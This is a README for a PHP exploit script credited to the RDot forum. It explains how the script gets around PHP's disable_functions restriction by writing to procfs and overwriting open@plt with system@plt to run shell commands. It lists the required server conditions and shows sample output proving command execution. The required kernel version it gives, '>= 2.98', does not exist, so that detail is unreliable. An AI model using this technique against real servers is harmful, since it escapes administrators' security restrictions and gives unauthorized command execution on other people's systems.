# PHP disable_functions bypass

Original topic on RDot forum (russian): https://rdot.org/forum/showthread.php?t=3309

This script exploits the possibility to write to procfs and rewrites the open@plt address with system@plt address. After that you can run shell commands with, for example, readfile(). Addresses are obtained automatically after ELF parsing of libc and php binary.

Conditions:
* Linux kernel version >= 2.98,
* PHP-CGI or PHP-FPM (modern Apache versions with mod_php call setuid, thus, there's no access to procfs),
* Linux x64 (you can adjust offsets to make it work on x32 system),
* open_basedir = Off (or you should be able to bypass it to read /lib and to read and write in /proc).

Example of usage:
```
$ php procfs_bypass.php
[*] PHP disable_functions procfs bypass (coded by Beched, RDot.Org)
[*] Trying to get open@plt offset in PHP binary
[+] Address is 0xe94998
[*] Libc location: /lib/x86_64-linux-gnu/libc-2.19.so
[*] Trying to get open and system symbols from Libc
[+] Got it. Seeking for address in memory
[*] open@plt addr: 0x7f150f86d150
[*] system@plt addr: 0x7f150f7c7530
[*] Rewriting open@plt address
[+] Address written. Executing cmd
uid=1000(beched) gid=1000(beched) группы=1000(beched),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),110(sambashare)
```
